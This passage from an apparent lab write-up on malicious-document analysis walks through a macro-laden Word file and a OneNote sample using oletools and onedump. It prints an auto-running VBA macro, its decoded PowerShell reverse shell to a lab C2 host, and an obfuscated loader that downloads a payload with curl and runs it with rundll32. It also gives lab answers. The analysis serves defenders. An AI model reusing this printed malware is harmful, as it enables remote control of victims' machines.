Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: suspicious.doc

+----------------------------+---------------------+---------------------+
| Stream/Storage name        | Modification Time   | Creation Time       |
+----------------------------+---------------------+---------------------+
| Root                       | 2023-09-12 11:46:53 | None                |
| '\x01CompObj'              | None                | None                |
| '\x05DocumentSummaryInform | None                | None                |
| ation'                     |                     |                     |
| '\x05SummaryInformation'   | None                | None                |
| '1Table'                   | None                | None                |
| 'Macros'                   | 2023-09-12 11:46:53 | 2023-09-12 11:46:53 |
| 'Macros/PROJECT'           | None                | None                |
| 'Macros/PROJECTwm'         | None                | None                |
| 'Macros/VBA'               | 2023-09-12 11:46:53 | 2023-09-12 11:46:53 |
| 'Macros/VBA/NewMacros'     | None                | None                |
| 'Macros/VBA/ThisDocument'  | None                | None                |
| 'Macros/VBA/_VBA_PROJECT'  | None                | None                |
| 'Macros/VBA/dir'           | None                | None                |
| 'WordDocument'             | None                | None                |
+----------------------------+---------------------+---------------------+
```

`olemap` shows information about different sectors of the file.

``` sh
remnux@thm-remnux:~/worddoc$ olemap suspicious.doc 
olemap 0.55 - http://decalage.info/python/oletools
-------------------------------------------------------------------------------
FILE: suspicious.doc

OLE HEADER:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|OLE Signature (hex)     |D0CF11E0A1B11AE1|Should be D0CF11E0A1B11AE1         |
|Header CLSID            |                |Should be empty (0)                |
|Minor Version           |003E            |Should be 003E                     |
|Major Version           |0003            |Should be 3 or 4                   |
|Byte Order              |FFFE            |Should be FFFE (little endian)     |
|Sector Shift            |0009            |Should be 0009 or 000C             |
|# of Dir Sectors        |0               |Should be 0 if major version is 3  |
|# of FAT Sectors        |1               |                                   |
|First Dir Sector        |00000028        |(hex)                              |
|Transaction Sig Number  |0               |Should be 0                        |
|MiniStream cutoff       |4096            |Should be 4096 bytes               |
|First MiniFAT Sector    |0000002A        |(hex)                              |
|# of MiniFAT Sectors    |2               |                                   |
|First DIFAT Sector      |FFFFFFFE        |(hex)                              |
|# of DIFAT Sectors      |0               |                                   |
+------------------------+----------------+-----------------------------------+

CALCULATED ATTRIBUTES:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|Sector Size (bytes)     |512             |Should be 512 or 4096 bytes        |
|Actual File Size (bytes)|32768           |Real file size on disk             |
|Max File Size in FAT    |66048.0         |Max file size covered by FAT       |
|Extra data beyond FAT   |0               |Only if file is larger than FAT    |
|                        |                |coverage                           |
|Extra data offset in FAT|00008000        |Offset of the 1st free sector at   |
|                        |                |end of FAT                         |
|Extra data size         |0               |Size of data starting at the 1st   |
|                        |                |free sector at end of FAT          |
+------------------------+----------------+-----------------------------------+

To display the FAT or MiniFAT structures, use options --fat or --minifat, and -h for help.

```

`olevba` is an important tool widely used for analysis. It extracts all VBA objects found within the file and shares the summary of the suspicious elements.

``` sh
remnux@thm-remnux:~/worddoc$ olevba suspicious.doc 
olevba 0.56 on Python 3.6.9 - http://decalage.info/python/oletools
===============================================================================
FILE: suspicious.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: suspicious.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: suspicious.doc - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
        AutoOpenMacro
End Sub

Sub Document_Open()
        AutoOpenMacro
End Sub

Sub AutoOpenMacro()
        Dim Str As String

        Str = Str + "powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT"
        Str = Str + "2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh"
        Str = Str + "0dHA6Ly90aG1yZWR0ZWFtLnRobS9zdGFnZTIuZXhlIiw0NDQ0K"
        Str = Str + "Tskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVt"
        Str = Str + "dXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJ"
        Str = Str + "HN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk"
        Str = Str + "pIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hb"
        Str = Str + "WUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5"
        Str = Str + "nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0Y"
        Str = Str + "SAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2V"
        Str = Str + "uZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZ"
        Str = Str + "W5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXR"
        Str = Str + "CeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kY"
        Str = Str + "nl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2g"
        Str = Str + "oKX07JGNsaWVudC5DbG9zZSgp"

        CreateObject("Wscript.Shell").Run Str
End Sub
```

The above output shows the macros found within the document. The summary of key elements is show below.

``` sh
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|IOC       |powershell.exe      |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

The summary show that:

- The document will automatically execute when it will be opened.
- It contains suspicious Bas64 strings and powershell code

`oledump` is a tool for analyzing and extracting streams to detect and examine potentially malicious content like macros or embedded objects.  

``` sh
remnux@thm-remnux:~/worddoc$ oledump.py suspicious.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7385 '1Table'
  5:       412 'Macros/PROJECT'
  6:        71 'Macros/PROJECTwm'
  7: M    3303 'Macros/VBA/NewMacros'
  8: m     938 'Macros/VBA/ThisDocument'
  9:      2634 'Macros/VBA/_VBA_PROJECT'
 10:       569 'Macros/VBA/dir'
 11:      4096 'WordDocument'

```

Objects are represented with numbers, which can be accessed using the `-sX` flag, where *X* is the object number. Moreover, metadata can be shown like with `olemeta` with the `-M` flag.
In order to clearly see the VBA and not a raw binary flow, we must use the `-v` flag to decompress VBA.

``` sh
remnux@thm-remnux:~/worddoc$ oledump.py -s7 -v suspicious.doc 
Attribute VB_Name = "NewMacros"
Sub AutoOpen()
        AutoOpenMacro
End Sub

Sub Document_Open()
        AutoOpenMacro
End Sub

Sub AutoOpenMacro()
        Dim Str As String

        Str = Str + "powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT"
        Str = Str + "2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh"
        Str = Str + "0dHA6Ly90aG1yZWR0ZWFtLnRobS9zdGFnZTIuZXhlIiw0NDQ0K"
        Str = Str + "Tskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVt"
        Str = Str + "dXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJ"
        Str = Str + "HN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk"
        Str = Str + "pIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hb"
        Str = Str + "WUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5"
        Str = Str + "nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0Y"
        Str = Str + "SAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2V"
        Str = Str + "uZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZ"
        Str = Str + "W5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXR"
        Str = Str + "CeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kY"
        Str = Str + "nl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2g"
        Str = Str + "oKX07JGNsaWVudC5DbG9zZSgp"

        CreateObject("Wscript.Shell").Run Str
End Sub
```

Now we successfully extracted the VBA script and got an idea of its capabilities, we can use `vmonkey <document>` to analyze and emulate the behavior of malicious macros in Microsoft Office documents.

``` sh
remnux@thm-remnux:~/worddoc$ vmonkey suspicious.doc 
 _    ___                 __  ___            __             
| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
     /_/                                           /____/   
vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

===============================================================================
FILE: suspicious.doc
INFO     Starting emulation...
INFO     Emulating an Office (VBA) file.
INFO     Reading document metadata...
Traceback (most recent call last):
  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in <module>
    from unotools import Socket, connect
ModuleNotFoundError: No module named 'unotools'
ERROR    Running export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_1428744234']' returned non-zero exit status 1
ERROR    Reading in file as Excel with xlrd failed. Can't find workbook in OLE2 compound document
INFO     Saving dropped analysis artifacts in .//suspicious.doc_artifacts/
INFO     Parsing VB...
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file:  - OLE stream: u'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file:  - OLE stream: u'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Sub AutoOpen()
        AutoOpenMacro
End Sub
...
```

Where we used to perform static analysis and extraction, *Vipermonkey* now enables dynamic analysis by executing the embedded macro in an isolated environment to extract IOCs and other valuable information.

``` text
TRACING VBA CODE (entrypoint = Auto*):
INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'
INFO     Emulating loose statements...
INFO     ACTION: Found Entry Point - params 'autoopen' - 
INFO     evaluating Sub AutoOpen
INFO     Calling Procedure: AutoOpenMacro('[]')
INFO     evaluating Sub AutoOpenMacro
INFO     Found possible intermediate IOC (base64): 'powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh ...'
INFO     calling Function: CreateObject('Wscript.Shell')
INFO     ACTION: CreateObject - params ['Wscript.Shell'] - Interesting Function Call
INFO     calling Function: Run('powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2...)
...

Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | autoopen                  |                           |
| CreateObject      | ['Wscript.Shell']         | Interesting Function Call |
| Run               | ['powershell.exe -nop -w  | Interesting Function Call |
|                   | hidden -e bGllbnQgPSBOZXc |                           |
|                   | tT2JqZWN0IFN5c3RlbS5OZXQu |    
...

```

As a result, we get a false positive URL and an interesting base64 encoded string. Using tools like *Cyberchef* or `base64 -d`, we are able to get the actual powershell code.

``` powershell
client = New-Object System.Net.Sockets.TCPClient("http://thmredteam.thm/stage2.exe",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The base64 decoded string result clearly shows the Powershell code. It is evident that the document would try to connect to the C2 server on port *4444* to download the malware called *stage2*.

``` url
http://thmredteam.thm/stage2.exe
```

Finally, we have found the IOC, which is a C2 server. From a SOC analyst's perspective, we will move on creating a detection rule on outbound traffic to detect if any host has communicated to this C2 server in the past or in the future. If any communication is observed, it means the host have been comprmised and needs immediate remedy.

### Questions

**What is the author name of the document found during the analysis?**

This question can be answered with `olemeta`/`oledump`.

*Answer: `CMNatic`*

**How many macros are embedded in the document?**

This question can be answered with `olevba`/`oledump`.

*Answer: `1`*

**What is the URL extracted from the suspicious.doc file?**

Using *Cyberchef* with *From Base64 -> Extract URLs*:

*Answer: `http://thmredteam.thm/stage2.exe`*

## Task 9 - OneNote

OneNote is a popular note-taking and collaboration tool developed by Microsoft. It allows users to create and organize digital notebooks containing various types of content, such as text, images, audio ...
OneNote files are saved with a *.one* or *.onenote* extension.

Recently, different APT groups have started utilizing OneNote document in their recent campaigns. In [MalwareBazaar](https://bazaar.abuse.ch/browse.php?search=file_type%3Aone), it is possible to retrieve plenty of rogue notes.

{% include figure.liquid path="/assets/img/images/thm_maldoc_static_analysis/H16m2AQxyg.png" title="MalwareVazaar OneNote Documents" class="img-fluid rounded z-depth-1" %}

We will be using one of the documents from the above list to practice analyzing and see if we can extract some ofuscated code or IOCs.

Within the provided lab, we will be using the `invoice.one` document.

### Analyzing the document

We will use `trid` for file identification. It is indeed a OneNote document.

``` sh
remnux@thm-remnux:~/onenoteDocs$ trid invoice.one 

TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
Definitions found:  13206
Analyzing...

Collecting data from file: invoice.one
100.0% (.ONE) Microsoft OneNote note (16008/2)
```

Firstly, we take out strings to see if there is anything interesting in the file like *IP addresses, scripts, domains*...

``` sh
remnux@thm-remnux:~/onenoteDocs$ strings invoice.one -n 20
Copyright (c) 1998 Hewlett-Packard Company
IEC http://www.iec.ch
IEC http://www.iec.ch
.IEC 61966-2.1 Default RGB colour space - sRGB
.IEC 61966-2.1 Default RGB colour space - sRGB
,Reference Viewing Condition in IEC61966-2.1
,Reference Viewing Condition in IEC61966-2.1
Copyright (c) 1998 Hewlett-Packard Company
IEC http://www.iec.ch
IEC http://www.iec.ch
.IEC 61966-2.1 Default RGB colour space - sRGB
.IEC 61966-2.1 Default RGB colour space - sRGB
,Reference Viewing Condition in IEC61966-2.1
,Reference Viewing Condition in IEC61966-2.1
<div id="content">f5&u5&n5&c5&t5&i5&o5&n5& 5&s5&l5&e5&e5&p5&(5&m5&i5&l5&l5&i5&s5&)5&{5&v5&a5&r5& 5&d5&a5&t5&e5& 5&=5& 5&n5&e5&w5& 5&D5&a5&t5&e5&(5&)5&;5&v5&a5&r5& 5&c5&u5&r5&D5&a5&t5&e5& 5&=5& 5&n5&u5&l5&l5&;5&d5&o5& 5&{5& 5&c5&u5&r5&D5&a5&t5&e5& 5&=5& 5&n5&e5&w5& 5&D5&a5&t5&e5&(5&)5&;5& 5&}5&w5&h5&i5&l5&e5&
...
<script language="javascript">
var hello = "39cd7b469beae7c617c73e0d008195ef";
var content = document.getElementById("content").innerText;
<script language="vbscript">
Dim ws : Set ws = CreateObject("WScript.Shell")
ws.RegWrite "HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values", content, "REG_SZ"
' msgbox ws.RegRead("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")
<script language="javascript">
var body = ws.RegRead("HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values");
var func = Function("url", body.replace(/5&/g, ""));
func("https://unitedmedicalspecialties.com/T1Gpp/OI.png");
<script language="vbscript">
ws.RegDelete("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")
<html><head><script language="vbscript">
Sub PsIfYCwsFUxaTzhDcniBNSKKlpFvBQkq(fVyZuxSyFixqmNzeEtgoYpnLGIiLoMtQAkqFX) : eval("execute(fVyZuxSyFixqmNzeEtgoYpnLGIiLoMtQAkqFX)") : End Sub
...
```

Because it looks like we are getting some references to some suspicious code, we will use another utility called `onedump.py`.

``` sh
remnux@thm-remnux:~/onenoteDocs$ python3 onedump.py invoice.one 
File: invoice.one
 1: 0x00001740 .... ffd8ffe2 0x00015b4f 4d5f7afd30851031376da0fa6d0e3f80
 2: 0x0001d290 .... ffd8ffe2 0x0000d36f 2ccb7fd40e61b6dd2cd936e61929fb81
 3: 0x0002ae58 .PNG 89504e47 0x000000ef 088833d5a4fdcd105a34657922326f76
 4: 0x0002bb00 .PNG 89504e47 0x00000128 33dca72504d567c57f95452a0358ed2f
 5: 0x0002bc60 <htm 3c68746d 0x00000817 c9d2355fc2be90b0fa73ecb67061a77e
 6: 0x0002d628 <htm 3c68746d 0x00005c19 b915056524f1b25937074727cdf5f87c
```

Subsequently, we get two interesting objects which seem to have HTML files. We shall use `-s X`, which *X* is the object number, to search for the *X* object and the `-d` flag to dump it on the screen.

``` sh
remnux@thm-remnux:~/onenoteDocs$ python3 onedump.py -s 5 -d invoice.one 
<html>

<div id="content">f5&u5&n5&c5&t5&i5&o5&n5& 5&s5&l5&e5&e5&p5&(5&m5&i5&l5&l5&i5&s5&)5&{5&v5&a5&r5& 5&d5&a5&t5&e5& 5&=5& 5&n5&e5&w5& 5&D5&a5&t5&e5&(5&)5&;5&v5&a5&r5& 5&c5&u5&r5&D5&a5&t5&e5& 5&=5& 5&n5&u5&l5&l5&;5&d5&o5& 5&{5& 5&c5&u5&r5&D5&a5&t5&e5& 5&=5& 5&n5&e5&w5& 5&D5&a5&t5&e5&(5&)5&;5& 5&}5&w5&h5&i5&l5&e5&(5&c5&u5&r5&D5&a5&t5&e5& 5&-5& 5&d5&a5&t5&e5& 5&<5& 5&m5&i5&l5&l5&i5&s5&)5&;5&}5&/5&*5&*5& 5&v5&a5&r5& 5&u5&r5&l5& 5&=5& 5&"5&h5&t5&t5&p5&s5&:5&/5&/5&g5&o5&o5&g5&l5&e5&.5&c5&o5&m5&"5&;5& 5&*5&/5&n5&e5&w5& 5&A5&c5&t5&i5&v5&e5&X5&O5&b5&j5&e5&c5&t5&(5&"5&w5&s5&c5&r5&i5&p5&t5&.5&s5&h5&e5&l5&l5&"5&)5&.5&r5&u5&n5&(5&"5&c5&u5&r5&l5&.5&e5&x5&e5& 5&-5&-5&o5&u5&t5&p5&u5&t5& 5&C5&:5&\5&\5&P5&r5&o5&g5&r5&a5&m5&D5&a5&t5&a5&\5&\5&i5&n5&d5&e5&x5&15&.5&p5&n5&g5& 5&-5&-5&u5&r5&l5& 5&"5& 5&+5& 5&u5&r5&l5&,5& 5&05&)5&;5&s5&l5&e5&e5&p5&(5&15&55&05&05&05&)5&;5&v5&a5&r5& 5&s5&h5&e5&l5&l5& 5&=5& 5&n5&e5&w5& 5&A5&c5&t5&i5&v5&e5&X5&O5&b5&j5&e5&c5&t5&(5&"5&s5&h5&e5&l5&l5&.5&a5&p5&p5&l5&i5&c5&a5&t5&i5&o5&n5&"5&)5&;5&s5&h5&e5&l5&l5&.5&s5&h5&e5&l5&l5&e5&x5&e5&c5&u5&t5&e5&(5&"5&r5&u5&n5&d5&l5&l5&35&25&"5&,5& 5&"5&C5&:5&\5&\5&P5&r5&o5&g5&r5&a5&m5&D5&a5&t5&a5&\5&\5&i5&n5&d5&e5&x5&15&.5&p5&n5&g5&,5&W5&i5&n5&d5&"5&,5& 5&"5&"5&,5& 5&"5&o5&p5&e5&n5&"5&,5& 5&35&)5&;5&</div>

<script language="javascript">

var hello = "39cd7b469beae7c617c73e0d008195ef";

var content = document.getElementById("content").innerText;

</script>

<script language="vbscript">

Dim ws : Set ws = CreateObject("WScript.Shell")

' Write reg
ws.RegWrite "HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values", content, "REG_SZ"

' msgbox ws.RegRead("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")

</script>

<script language="javascript">

var body = ws.RegRead("HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values");

var func = Function("url", body.replace(/5&/g, ""));
func("https://unitedmedicalspecialties.com/T1Gpp/OI.png");

</script>

<script language="vbscript">

ws.RegDelete("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")

' Close window
window.close

</script>

</html>
```

This file looks like HTML code containing obfuscated Javascript and VBScript. We will save it using `python3 onedump.py -s 5 -d invoice.one > obj5` and open it in notepad.

{% include figure.liquid path="/assets/img/images/thm_maldoc_static_analysis/SyA0QkEg1g.png" title="OneNote obfuscated code" class="img-fluid rounded z-depth-1" %}

This extraction results in some interesting obfuscated code. The javascript part clearly uses a *replace* function to remove `5&` from the string.

{% include figure.liquid path="/assets/img/images/thm_maldoc_static_analysis/rJw5Nk4e1l.png" title="OneNote deobfuscated code" class="img-fluid rounded z-depth-1" %}

Now, the code makes more sense and contains some important IOCs. To sum up the findings:

- The OneNote document contains **two suspicious HTML** objects.
- This script contains **obfuscated code**, which is cleared out by removing `5&`.
- The script **writes the deobfuscated script to the registry** `HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values`.
- **Runs the script**.
- **C2 domain** is `hxxps[:]//unitedmedicalspecialties[.]com/T1Gpp/OI.png`.
- It **downloads the payload** using *cURL* and outputs the payload into *index1.png* with `curl.exe --output C:\\\\ProgramData\\\\index1.png --url " + url, 0);`.
- **Sleeps for 15 seconds** using `sleep(15000)`.
- **Runs the payload** using *rundll32* -> `shell.shellexecute("rundll32", "C:\\ProgramData\\index1.png,Wind", "", "open", 3);`.
- **Deletes the registry entry**.

### Questions

**What is the value used in the sleep function?**

*Answer: `15000`*

**The cURL command is being used to download from a URL and saving the payload in a png file. What is that file name?**

*Answer: `index1.png`*

**How many objects are found in the *invoice.one* document?**

It is known by checking how many objects are listed in `onedump.py`.

*Answer: `6`*

## Task 10 - Conclusion

In conclusion, we have examined various document file types and explored how they can be weaponized in cyberattacks. Our focus was primarily on the PDF format, where we learned to perform static analysis by inspecting obfuscated JavaScript. We also explored 97-2003 Word documents, extracting Indicators of Compromise (IOCs) from VBA macros, and analyzed OneNote files, particularly those containing HTML embedded objects with obfuscated JavaScript and VBS code.

Future modules will delve into more advanced topics, such as dynamic document analysis and deobfuscating scripts like PowerShell, JavaScript, and VBScript.
